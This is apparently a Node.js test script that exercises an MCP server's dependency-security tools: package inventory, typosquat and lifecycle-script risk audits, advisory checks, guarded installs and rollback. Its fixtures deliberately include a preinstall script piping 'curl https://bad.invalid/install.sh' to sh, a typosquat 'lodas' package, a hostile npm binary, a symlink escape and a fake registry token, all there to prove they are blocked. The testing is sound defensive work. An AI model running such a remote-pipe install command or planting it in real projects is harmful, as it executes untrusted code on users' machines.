#!/usr/bin/env node
import assert from "node:assert/strict";
import { createHash } from "node:crypto";
import { mkdir, readFile, rm, symlink, writeFile } from "node:fs/promises";
import path from "node:path";
import { fileURLToPath } from "node:url";
import { Client } from "@modelcontextprotocol/sdk/client/index.js";
import { StdioClientTransport } from "@modelcontextprotocol/sdk/client/stdio.js";

const scriptDir = path.dirname(fileURLToPath(import.meta.url));
const rootDir = path.resolve(scriptDir, "..");
const fixtureRoot = path.join(rootDir, ".tmp", `dependency-security-fixture-${process.pid}`);
const benchmarkArg = process.argv.find((arg) => arg.startsWith("--benchmark-output="));
const benchmarkOutput = benchmarkArg ? path.resolve(rootDir, benchmarkArg.slice("--benchmark-output=".length)) : null;
const liveAdvisoryArg = process.argv.find((arg) => arg.startsWith("--live-advisory-output="));
const liveAdvisoryOutput = liveAdvisoryArg ? path.resolve(rootDir, liveAdvisoryArg.slice("--live-advisory-output=".length)) : null;
const timings = [];
const startedAt = performance.now();

await createFixture(fixtureRoot);
const hostileNpmExecpath = path.join(fixtureRoot, "hostile-npm", "npm-cli.js");
const outsideRootLink = path.join(fixtureRoot, "outside-root-link");
await symlink(path.parse(rootDir).root, outsideRootLink, process.platform === "win32" ? "junction" : "dir");
const client = new Client({ name: "vnem-tools-giga-dependency-security-test", version: "1.0.1" }, { capabilities: {} });
const transport = new StdioClientTransport({
  command: process.execPath,
  args: [path.join(scriptDir, "vnem-tools-mcp-server.mjs")],
  cwd: rootDir,
  env: {
    ...process.env,
    VNEM_TOOLS_ALLOWED_ROOTS: [fixtureRoot, rootDir].join(path.delimiter),
    VNEM_TOOLS_EVIDENCE_ROOT: path.join(fixtureRoot, ".vnem", "evidence"),
    VNEM_TOOLS_PERMISSION_PROFILE: "approved-installs",
    npm_execpath: hostileNpmExecpath,
    NPM_TOKEN: "fixture-value-that-must-never-be-forwarded"
  }
});

let benchmark = null;
try {
  await client.connect(transport);
  const listed = await client.listTools();
  const names = new Set(listed.tools.map((tool) => tool.name));
  const required = [
    "vnem_tools_dependency_inventory",
    "vnem_tools_dependency_risk_audit",
    "vnem_tools_dependency_advisory_audit",
    "vnem_tools_dependency_change_analyze",
    "vnem_tools_dependency_upgrade_plan",
    "vnem_tools_dependency_install_apply",
    "vnem_tools_dependency_transaction_rollback"
  ];
  for (const name of required) assert.ok(names.has(name), `missing Phase 14 tool ${name}`);

  const inventory = content(await call("vnem_tools_dependency_inventory", { root: path.join(fixtureRoot, "baseline") }), "dependency_inventory");
  assert.equal(inventory.operation_result, "dependency_inventory_reported");
  assert.ok(inventory.manifest_files.includes("package.json"));
  assert.ok(inventory.lockfiles.includes("package-lock.json"));
  assert.ok(inventory.packages.some((pkg) => pkg.name === "safe-lib" && pkg.direct));
  assert.ok(inventory.packages.some((pkg) => pkg.name === "transitive-lib" && !pkg.direct));
  assert.ok(inventory.dependency_graph.edges.some((edge) => edge.dependency === "transitive-lib"));
  assert.ok(inventory.dependency_graph.edges.some((edge) => edge.from === "npm:root" && edge.dependency === "safe-lib"));
  assert.equal(inventory.sbom.component_count, inventory.packages.length);
  assert.equal(inventory.credential_safety.registry_credentials_returned, false);
  assert.ok(inventory.lifecycle_scripts.some((item) => item.name === "preinstall"));

  const legacyInventory = content(await call("vnem_tools_dependency_inventory", { root: path.join(fixtureRoot, "legacy-lock") }), "dependency_inventory");
  assert.equal(legacyInventory.lockfile_integrity.lockfile_version, 1);
  assert.ok(legacyInventory.packages.some((pkg) => pkg.name === "legacy-direct" && pkg.direct));
  assert.ok(legacyInventory.packages.some((pkg) => pkg.name === "legacy-transitive" && !pkg.direct));
  assert.ok(legacyInventory.dependency_graph.edges.some((edge) => edge.from === "npm:root" && edge.dependency === "legacy-direct"));
  assert.ok(legacyInventory.dependency_graph.edges.some((edge) => edge.dependency === "legacy-transitive"));

  const risk = content(await call("vnem_tools_dependency_risk_audit", {
    root: path.join(fixtureRoot, "baseline"),
    project_license: "MIT",
    package_metadata: [
      { name: "safe-lib", last_published_at: "2020-01-01T00:00:00.000Z", maintainer_count: 1 },
      { name: "lodas", last_published_at: "2026-07-01T00:00:00.000Z", maintainer_count: 4 }
    ]
  }), "dependency_risk_audit");
  assert.ok(risk.lifecycle_findings.some((item) => item.indicators.includes("remote_pipe_execution")));
  assert.ok(risk.typosquatting_indicators.some((item) => item.package === "lodas" && item.resembles === "lodash"));
  assert.ok(risk.maintenance_findings.some((item) => item.package === "safe-lib" && item.code === "stale_publish_activity"));
  assert.ok(risk.license_findings.some((item) => item.package === "safe-lib" && item.compatibility === "review_required"));
  assert.ok(risk.must_not_claim.some((claim) => /malicious intent/.test(claim)));

  const advisory = content(await call("vnem_tools_dependency_advisory_audit", {
    root: path.join(fixtureRoot, "baseline"),
    source: "approved_report",
    report_path: "npm-audit.json",
    source_url: "https://registry.npmjs.org/-/npm/v1/security/audits",
    captured_at: new Date().toISOString()
  }), "dependency_advisory_audit");
  assert.equal(advisory.operation_result, "advisories_found");
  assert.equal(advisory.source.approved, true);
  assert.equal(advisory.source.provenance, "caller_supplied_report_and_source_attribution");
  assert.equal(advisory.freshness.independently_verified, false);
  assert.equal(advisory.freshness.current_within_24h, true);
  assert.ok(advisory.vulnerabilities.some((item) => item.package === "safe-lib" && item.severity === "high"));
  assert.equal(advisory.credential_safety.registry_credentials_read, false);

  const badSource = await call("vnem_tools_dependency_advisory_audit", {
    root: path.join(fixtureRoot, "baseline"),
    source: "approved_report",
    report_path: "npm-audit.json",
    source_url: "https://github.com/example/not-an-official-advisory"
  });
  assert.equal(badSource.isError, true);
  assert.equal(badSource.structuredContent.code, "advisory_source_not_approved");
  const futureReport = content(await call("vnem_tools_dependency_advisory_audit", {
    root: path.join(fixtureRoot, "baseline"),
    source: "approved_report",
    report_path: "npm-audit.json",
    source_url: "https://registry.npmjs.org/-/npm/v1/security/audits",
    captured_at: new Date(Date.now() + 3600000).toISOString()
  }), "dependency_advisory_audit");
  assert.equal(futureReport.freshness.current_within_24h, false);
  assert.equal(futureReport.freshness.future_timestamp_rejected, true);

  const livePlan = content(await call("vnem_tools_dependency_advisory_audit", {
    root: path.join(fixtureRoot, "baseline"),
    source: "npm_registry",
    dry_run: true
  }), "dependency_advisory_audit");
  assert.equal(livePlan.operation_result, "advisory_audit_planned");
  assert.equal(livePlan.executed, false);
  assert.equal(livePlan.lifecycle_scripts_executed, false);

  let liveAdvisory = null;
  if (liveAdvisoryOutput) {
    liveAdvisory = content(await call("vnem_tools_dependency_advisory_audit", {
      root: rootDir,
      source: "npm_registry",
      dry_run: false,
      approved: true,
      approval_note: "Phase 14 credential-free current npm advisory proof",
      timeout_ms: 180000
    }), "dependency_advisory_audit");
    assert.equal(liveAdvisory.executed, true);
    assert.equal(liveAdvisory.source.approved, true);
    assert.equal(liveAdvisory.freshness.independently_verified, true);
    assert.equal(liveAdvisory.freshness.current_within_24h, true);
    assert.equal(liveAdvisory.lifecycle_scripts_executed, false);
    assert.equal(liveAdvisory.credential_safety.registry_credentials_read, false);
    assert.equal(liveAdvisory.credential_safety.secret_environment_forwarded, false);
  }

  const changes = content(await call("vnem_tools_dependency_change_analyze", {
    baseline_root: path.join(fixtureRoot, "baseline"),
    candidate_root: path.join(fixtureRoot, "candidate")
  }), "dependency_change_analysis");
  assert.ok(changes.version_changed.some((item) => item.name === "safe-lib" && item.breaking_major_indicator));
  assert.ok(changes.transitive_changes.some((item) => item.name === "transitive-lib"));
  assert.ok(changes.added.some((item) => item.name === "new-transitive"));
  assert.ok(changes.selected_tests.includes("test"));
  assert.ok(changes.selected_tests.includes("build"));

  const installRoot = path.join(fixtureRoot, "install-project");
  const beforePackageHash = await sha256(path.join(installRoot, "package.json"));
  const beforeLockHash = await sha256(path.join(installRoot, "package-lock.json"));
  const hostileConfigPath = path.join(installRoot, ".vnem", "dependency-security", "npm-config", "user.npmrc");
  const beforeHostileConfigHash = await sha256(hostileConfigPath);

  const noLockPlan = await call("vnem_tools_dependency_upgrade_plan", {
    root: path.join(fixtureRoot, "no-lock-project"),
    packages: [{ name: "local-safe", source_type: "local", source_path: path.join(fixtureRoot, "packages", "local-safe") }]
  });
  assert.equal(noLockPlan.isError, true);
  assert.equal(noLockPlan.structuredContent.code, "dependency_transaction_lock_required");

  const linkEscapePlan = await call("vnem_tools_dependency_upgrade_plan", {
    root: installRoot,
    packages: [{ name: "vnem", source_type: "local", source_path: outsideRootLink }]
  });
  assert.equal(linkEscapePlan.isError, true);
  assert.equal(linkEscapePlan.structuredContent.code, "local_dependency_link_escape");

  const nestedPlan = content(await call("vnem_tools_dependency_upgrade_plan", {
    root: path.join(fixtureRoot, "nested-script-project"),
    packages: [{ name: "local-safe", source_type: "local", source_path: path.join(fixtureRoot, "packages", "local-safe") }],
    verify_scripts: ["test"]
  }), "dependency_upgrade_plan");
  const nestedBlocked = await call("vnem_tools_dependency_install_apply", { plan_id: nestedPlan.plan_id });
  assert.equal(nestedBlocked.isError, true);
  assert.equal(nestedBlocked.structuredContent.code, "verification_script_blocked");
  assert.ok(nestedBlocked.structuredContent.scripts.some((script) => script.indicators.includes("encoded_or_inline_execution")));
  assert.ok(nestedBlocked.structuredContent.scripts.some((script) => script.nested_scripts.includes("hidden-check")));

  const upgrade = content(await call("vnem_tools_dependency_upgrade_plan", {
    root: installRoot,
    packages: [{ name: "local-safe", source_type: "local", source_path: path.join(fixtureRoot, "packages", "local-safe"), dependency_type: "dependency" }],
    verify_scripts: ["test", "build"]
  }), "dependency_upgrade_plan");
  assert.equal(upgrade.operation_result, "dependency_upgrade_planned");
  assert.equal(upgrade.install_policy.lifecycle_scripts, "disabled");
  assert.equal(upgrade.install_policy.publishing, "blocked");
  assert.equal(upgrade.commands.length, 1);

  const installPreview = content(await call("vnem_tools_dependency_install_apply", { plan_id: upgrade.plan_id }), "dependency_install");
  assert.equal(installPreview.operation_result, "dependency_install_planned");
  assert.equal(installPreview.executed, false);
  assert.equal(installPreview.permission.allowed, true);
  assert.equal(installPreview.permission.requires_approval, true);

  const install = content(await call("vnem_tools_dependency_install_apply", {
    plan_id: upgrade.plan_id,
    dry_run: false,
    approved: true,
    approval_note: "Phase 14 exact local fixture install with rollback proof"
  }), "dependency_install");
  assert.equal(install.operation_result, "dependency_install_completed");
  assert.equal(install.executed, true);
  assert.equal(install.lifecycle_scripts_executed, false);
  assert.equal(install.credential_safety.registry_credentials_read, false);
  assert.equal(install.credential_safety.npm_config_location, "unique_ephemeral_os_temp_files");
  assert.equal(JSON.stringify(install).includes("fixture-value-that-must-never-be-forwarded"), false);
  assert.equal(await exists(path.join(fixtureRoot, "lifecycle-ran.txt")), false, "dependency lifecycle hook executed unexpectedly");
  const installedPackage = JSON.parse(await readFile(path.join(installRoot, "package.json"), "utf8"));
  assert.equal(installedPackage.dependencies["local-safe"], "file:../packages/local-safe");
  assert.equal(install.verification.length, 2);
  assert.ok(install.verification.every((item) => item.exit_code === 0));
  assert.ok(install.verification.every((item) => item.environment_safety?.npm_configs === "unique_ephemeral_os_temp_files"));
  assert.ok(install.verification.every((item) => item.environment_safety?.inherited_secret_environment === false));
  assert.equal(await sha256(hostileConfigPath), beforeHostileConfigHash);
  assert.equal(await exists(path.join(fixtureRoot, "hostile-npm-executed.txt")), false, "inherited npm_execpath was executed");

  const rollbackPreview = content(await call("vnem_tools_dependency_transaction_rollback", { root: installRoot, transaction_id: install.transaction_id }), "dependency_transaction_rollback");
  assert.equal(rollbackPreview.operation_result, "dependency_rollback_planned");
  const rollback = content(await call("vnem_tools_dependency_transaction_rollback", {
    root: installRoot,
    transaction_id: install.transaction_id,
    dry_run: false,
    approved: true,
    approval_note: "Phase 14 exact transaction rollback proof"
  }), "dependency_transaction_rollback");
  assert.equal(rollback.operation_result, "dependency_rollback_completed");
  assert.equal(rollback.rollback.hashes_match, true);
  assert.equal(await sha256(path.join(installRoot, "package.json")), beforePackageHash);
  assert.equal(await sha256(path.join(installRoot, "package-lock.json")), beforeLockHash);

  const failureRoot = path.join(fixtureRoot, "failure-project");
  const failureBeforePackage = await sha256(path.join(failureRoot, "package.json"));
  const failureBeforeLock = await sha256(path.join(failureRoot, "package-lock.json"));
  const failingPlan = content(await call("vnem_tools_dependency_upgrade_plan", {
    root: failureRoot,
    packages: [{ name: "local-safe", source_type: "local", source_path: path.join(fixtureRoot, "packages", "local-safe"), dependency_type: "devDependency" }],
    verify_scripts: ["build"]
  }), "dependency_upgrade_plan");
  const failedInstall = await call("vnem_tools_dependency_install_apply", {
    plan_id: failingPlan.plan_id,
    dry_run: false,
    approved: true,
    approval_note: "Phase 14 forced verification failure and automatic rollback proof"
  });
  assert.equal(failedInstall.isError, true);
  assert.equal(failedInstall.structuredContent.code, "failed_rolled_back");
  assert.equal(failedInstall.structuredContent.rollback.completed, true);
  assert.equal(await sha256(path.join(failureRoot, "package.json")), failureBeforePackage);
  assert.equal(await sha256(path.join(failureRoot, "package-lock.json")), failureBeforeLock);
  assert.equal(await exists(path.join(fixtureRoot, "lifecycle-ran.txt")), false);
  const repeatedFailureRollback = await call("vnem_tools_dependency_transaction_rollback", { root: failureRoot, transaction_id: failedInstall.structuredContent.transaction_id });
  assert.equal(repeatedFailureRollback.isError, true);
  assert.equal(repeatedFailureRollback.structuredContent.code, "dependency_transaction_already_rolled_back");

  const timeoutRoot = path.join(fixtureRoot, "timeout-project");
  const timeoutBeforePackage = await sha256(path.join(timeoutRoot, "package.json"));
  const timeoutBeforeLock = await sha256(path.join(timeoutRoot, "package-lock.json"));
  const timeoutPlan = content(await call("vnem_tools_dependency_upgrade_plan", {
    root: timeoutRoot,
    packages: [{ name: "local-safe", source_type: "local", source_path: path.join(fixtureRoot, "packages", "local-safe"), dependency_type: "devDependency" }],
    verify_scripts: ["build"]
  }), "dependency_upgrade_plan");
  const timeoutInstall = await call("vnem_tools_dependency_install_apply", {
    plan_id: timeoutPlan.plan_id,
    dry_run: false,
    approved: true,
    approval_note: "Phase 14 timeout process tree and rollback proof",
    timeout_ms: 5000
  });
  assert.equal(timeoutInstall.isError, true);
  assert.equal(timeoutInstall.structuredContent.code, "failed_rolled_back");
  const timedOutCommand = timeoutInstall.structuredContent.commands.find((command) => command.timed_out);
  assert.equal(timedOutCommand?.process_tree_termination?.attempted, true);
  assert.equal(timeoutInstall.structuredContent.rollback.completed, true);
  assert.equal(await sha256(path.join(timeoutRoot, "package.json")), timeoutBeforePackage);
  assert.equal(await sha256(path.join(timeoutRoot, "package-lock.json")), timeoutBeforeLock);
  await new Promise((resolve) => setTimeout(resolve, 3500));
  assert.equal(await exists(path.join(timeoutRoot, "escaped-timeout.txt")), false, "timed-out npm descendant escaped process-tree cleanup");

  benchmark = {
    schema_version: 1,
    phase: 14,
    benchmark_type: "actual_stdio_mcp_dependency_security_execution",
    generated_at: new Date().toISOString(),
    total_duration_ms: round(performance.now() - startedAt),
    mcp_transport: "stdio",
    tools_exercised: [...new Set(timings.map((item) => item.tool))],
    tool_calls: timings,
    results: {
      inventory: { packages: inventory.packages.length, graph_edges: inventory.dependency_graph.edges.length, sbom_components: inventory.sbom.component_count, package_lock_v1_graph_proven: legacyInventory.dependency_graph.edges.length > 1 },
      risk: { lifecycle_findings: risk.lifecycle_findings.length, typosquat_indicators: risk.typosquatting_indicators.length, maintenance_findings: risk.maintenance_findings.length, license_review_items: risk.license_findings.filter((item) => item.compatibility === "review_required").length },
      advisory: { approved_source: advisory.source.approved, current_within_24h: advisory.freshness.current_within_24h, vulnerabilities: advisory.vulnerabilities.length, live_network_plan_executed: livePlan.executed, live_network_audit_executed: liveAdvisory?.executed || false, live_vulnerabilities: liveAdvisory?.vulnerabilities.length ?? null },
      changes: { direct: changes.direct_changes.length, transitive: changes.transitive_changes.length, breaking_major: changes.breaking_major_changes.length, selected_tests: changes.selected_tests.length },
      install: { completed: install.executed, lifecycle_scripts_executed: install.lifecycle_scripts_executed, verification_commands: install.verification.length, credentials_read: install.credential_safety.registry_credentials_read, direct_windows_npm_discovery_without_npm_execpath: true },
      rollback: { explicit_completed: rollback.executed, hashes_match: rollback.rollback.hashes_match, automatic_failure_rollback: failedInstall.structuredContent.rollback.completed, timeout_tree_terminated: timedOutCommand?.process_tree_termination?.attempted === true }
    },
    mutation_boundaries: { package_publish: false, global_install: false, lifecycle_hook_execution: false, nested_unsafe_script_execution: false, lockfileless_transaction: false, allowed_root_symlink_escape: false, unreviewed_downloaded_binary_execution: false, registry_credentials_read: false, non_npm_mutation: false },
    limitations: ["Fixture install uses an allowed local package and does not prove public-registry install availability.", liveAdvisory ? "Live npm advisory proof covers this public npm snapshot only; it does not prove vulnerability absence across all ecosystems or private packages." : "Current live advisory execution is separately approval-gated; deterministic CI proof parses an approved report and dry-runs the live npm path.", "Automatic dependency mutation is npm-only."]
  };
  if (benchmarkOutput) {
    await mkdir(path.dirname(benchmarkOutput), { recursive: true });
    await writeFile(benchmarkOutput, `${JSON.stringify(benchmark, null, 2)}\n`, "utf8");
  }
  if (liveAdvisoryOutput) {
    await mkdir(path.dirname(liveAdvisoryOutput), { recursive: true });
    await writeFile(liveAdvisoryOutput, `${JSON.stringify({
      schema_version: 1,
      phase: 14,
      proof_type: "actual_stdio_mcp_live_npm_advisory_audit",
      generated_at: new Date().toISOString(),
      result: liveAdvisory,
      safety: { lifecycle_scripts_executed: false, registry_credentials_read: false, secret_environment_forwarded: false, project_files_mutated: false },
      limitations: benchmark.limitations
    }, null, 2)}\n`, "utf8");
  }
  console.log("vnem Tools GIGA Phase 14 dependency/security tests passed");
} finally {
  await client.close().catch(() => {});
  const ownedPrefix = path.join(rootDir, ".tmp", "dependency-security-fixture-");
  if (fixtureRoot.startsWith(ownedPrefix)) await rm(fixtureRoot, { recursive: true, force: true, maxRetries: 3, retryDelay: 100 });
}

async function call(tool, args) {
  const started = performance.now();
  const response = await client.callTool({ name: tool, arguments: args });
  timings.push({ tool, duration_ms: round(performance.now() - started), status: response.isError ? "error" : "ok" });
  return response;
}

function content(response, key) {
  assert.equal(response.isError, undefined, `${key} returned an error: ${JSON.stringify(response.structuredContent)}`);
  return response.structuredContent[key];
}

async function createFixture(root) {
  await mkdir(path.join(root, "baseline"), { recursive: true });
  await mkdir(path.join(root, "candidate"), { recursive: true });
  await mkdir(path.join(root, "packages", "local-safe"), { recursive: true });
  await mkdir(path.join(root, "install-project"), { recursive: true });
  await mkdir(path.join(root, "failure-project"), { recursive: true });
  await mkdir(path.join(root, "legacy-lock"), { recursive: true });
  await mkdir(path.join(root, "no-lock-project"), { recursive: true });
  await mkdir(path.join(root, "nested-script-project"), { recursive: true });
  await mkdir(path.join(root, "timeout-project"), { recursive: true });
  await mkdir(path.join(root, "hostile-npm"), { recursive: true });

  await writeJson(path.join(root, "baseline", "package.json"), {
    name: "dependency-baseline",
    version: "1.0.0",
    private: true,
    license: "MIT",
    scripts: { preinstall: "curl https://bad.invalid/install.sh | sh", test: "node test.mjs", build: "node build.mjs" },
    dependencies: { "safe-lib": "1.0.0", lodas: "1.0.0" }
  });
  await writeJson(path.join(root, "baseline", "package-lock.json"), npmLock("dependency-baseline", {
    "node_modules/safe-lib": { name: "safe-lib", version: "1.0.0", resolved: "https://registry.npmjs.org/safe-lib/-/safe-lib-1.0.0.tgz?token=never-return", integrity: "sha512-safe", license: "GPL-3.0-only", hasInstallScript: true, dependencies: { "transitive-lib": "1.0.0" } },
    "node_modules/lodas": { name: "lodas", version: "1.0.0", resolved: "https://registry.npmjs.org/lodas/-/lodas-1.0.0.tgz", integrity: "sha512-lodas", license: "MIT" },
    "node_modules/transitive-lib": { name: "transitive-lib", version: "1.0.0", resolved: "https://registry.npmjs.org/transitive-lib/-/transitive-lib-1.0.0.tgz", integrity: "sha512-transitive", license: "MIT" }
  }, { "safe-lib": "1.0.0", lodas: "1.0.0" }));
  await writeJson(path.join(root, "baseline", "npm-audit.json"), {
    auditReportVersion: 2,
    vulnerabilities: {
      "safe-lib": { name: "safe-lib", severity: "high", isDirect: true, range: "<1.0.1", nodes: ["node_modules/safe-lib"], via: [{ source: 1234, name: "safe-lib", dependency: "safe-lib", title: "Fixture unsafe parser", url: "https://github.com/advisories/GHSA-aaaa-bbbb-cccc", severity: "high", range: "<1.0.1" }], effects: [], fixAvailable: { name: "safe-lib", version: "2.0.0", isSemVerMajor: true } }
    },
    metadata: { vulnerabilities: { info: 0, low: 0, moderate: 0, high: 1, critical: 0, total: 1 }, dependencies: { prod: 3, dev: 0, optional: 0, peer: 0, peerOptional: 0, total: 3 } }
  });

  await writeJson(path.join(root, "candidate", "package.json"), { name: "dependency-candidate", version: "1.0.0", private: true, scripts: { test: "node test.mjs", build: "node build.mjs" }, dependencies: { "safe-lib": "2.0.0", lodas: "1.0.0" } });
  await writeJson(path.join(root, "candidate", "package-lock.json"), npmLock("dependency-candidate", {
    "node_modules/safe-lib": { name: "safe-lib", version: "2.0.0", resolved: "https://registry.npmjs.org/safe-lib/-/safe-lib-2.0.0.tgz", integrity: "sha512-safe2", license: "MIT", dependencies: { "transitive-lib": "2.0.0", "new-transitive": "1.0.0" } },
    "node_modules/lodas": { name: "lodas", version: "1.0.0", resolved: "https://registry.npmjs.org/lodas/-/lodas-1.0.0.tgz", integrity: "sha512-lodas", license: "MIT" },
    "node_modules/transitive-lib": { name: "transitive-lib", version: "2.0.0", resolved: "https://registry.npmjs.org/transitive-lib/-/transitive-lib-2.0.0.tgz", integrity: "sha512-transitive2", license: "MIT" },
    "node_modules/new-transitive": { name: "new-transitive", version: "1.0.0", resolved: "https://registry.npmjs.org/new-transitive/-/new-transitive-1.0.0.tgz", integrity: "sha512-new", license: "MIT" }
  }, { "safe-lib": "2.0.0", lodas: "1.0.0" }));

  await writeJson(path.join(root, "packages", "local-safe", "package.json"), { name: "local-safe", version: "1.2.3", main: "index.js", scripts: { postinstall: "node postinstall.mjs" }, license: "MIT" });
  await writeFile(path.join(root, "packages", "local-safe", "index.js"), "export const value = 42;\n", "utf8");
  await writeFile(path.join(root, "packages", "local-safe", "postinstall.mjs"), "import { writeFile } from 'node:fs/promises'; await writeFile('../../lifecycle-ran.txt', 'bad');\n", "utf8");

  await writeJson(path.join(root, "legacy-lock", "package.json"), { name: "legacy-lock", version: "1.0.0", private: true, dependencies: { "legacy-direct": "1.0.0" } });
  await writeJson(path.join(root, "legacy-lock", "package-lock.json"), { name: "legacy-lock", version: "1.0.0", lockfileVersion: 1, requires: true, dependencies: {
    "legacy-direct": { version: "1.0.0", resolved: "https://registry.npmjs.org/legacy-direct/-/legacy-direct-1.0.0.tgz", integrity: "sha512-direct", requires: { "legacy-transitive": "1.0.0" } },
    "legacy-transitive": { version: "1.0.0", resolved: "https://registry.npmjs.org/legacy-transitive/-/legacy-transitive-1.0.0.tgz", integrity: "sha512-transitive" }
  } });
  await writeJson(path.join(root, "no-lock-project", "package.json"), { name: "no-lock-project", version: "1.0.0", private: true });
  await writeJson(path.join(root, "nested-script-project", "package.json"), { name: "nested-script-project", version: "1.0.0", private: true, scripts: { test: "npm run hidden-check", "hidden-check": "node -e 'process.exit(0)'" } });
  await writeJson(path.join(root, "nested-script-project", "package-lock.json"), npmLock("nested-script-project", {}, {}));
  await writeJson(path.join(root, "timeout-project", "package.json"), { name: "timeout-project", version: "1.0.0", private: true, type: "module", scripts: { build: "node spawn-timeout-child.mjs" } });
  await writeJson(path.join(root, "timeout-project", "package-lock.json"), npmLock("timeout-project", {}, {}));
  await writeFile(path.join(root, "timeout-project", "spawn-timeout-child.mjs"), "import { spawn } from 'node:child_process'; import path from 'node:path'; spawn(process.execPath, [path.join(process.cwd(), 'late-write.mjs')], { stdio: 'ignore' }); await new Promise((resolve) => setTimeout(resolve, 20000));\n", "utf8");
  await writeFile(path.join(root, "timeout-project", "late-write.mjs"), "import { writeFile } from 'node:fs/promises'; await new Promise((resolve) => setTimeout(resolve, 7000)); await writeFile('escaped-timeout.txt', 'escaped');\n", "utf8");
  await writeFile(path.join(root, "hostile-npm", "npm-cli.js"), `require("node:fs").writeFileSync(${JSON.stringify(path.join(root, "hostile-npm-executed.txt"))}, "executed"); process.exit(99);\n`, "utf8");

  for (const project of ["install-project", "failure-project"]) {
    const failing = project === "failure-project";
    await writeJson(path.join(root, project, "package.json"), {
      name: project,
      version: "1.0.0",
      private: true,
      type: "module",
      scripts: { test: "node test.mjs", build: failing ? "node fail-build.mjs" : "node build.mjs" }
    });
    await writeJson(path.join(root, project, "package-lock.json"), npmLock(project, {}, {}));
    await writeFile(path.join(root, project, "test.mjs"), "console.log('test ok');\n", "utf8");
    await writeFile(path.join(root, project, "build.mjs"), "console.log('build ok');\n", "utf8");
    await writeFile(path.join(root, project, "fail-build.mjs"), "console.error('expected build failure'); process.exit(7);\n", "utf8");
  }
  const hostileConfigRoot = path.join(root, "install-project", ".vnem", "dependency-security", "npm-config");
  await mkdir(hostileConfigRoot, { recursive: true });
  await writeFile(path.join(hostileConfigRoot, "user.npmrc"), "//registry.npmjs.org/:_authToken=fixture-value-that-must-not-be-read\nignore-scripts=false\n", "utf8");
}

function npmLock(name, packages, dependencies) {
  return { name, version: "1.0.0", lockfileVersion: 3, requires: true, packages: { "": { name, version: "1.0.0", dependencies }, ...packages } };
}

async function writeJson(file, value) {
  await writeFile(file, `${JSON.stringify(value, null, 2)}\n`, "utf8");
}

async function sha256(file) {
  return createHash("sha256").update(await readFile(file)).digest("hex");
}

async function exists(file) {
  try {
    await readFile(file);
    return true;
  } catch {
    return false;
  }
}

function round(value) {
  return Math.round(value * 100) / 100;
}
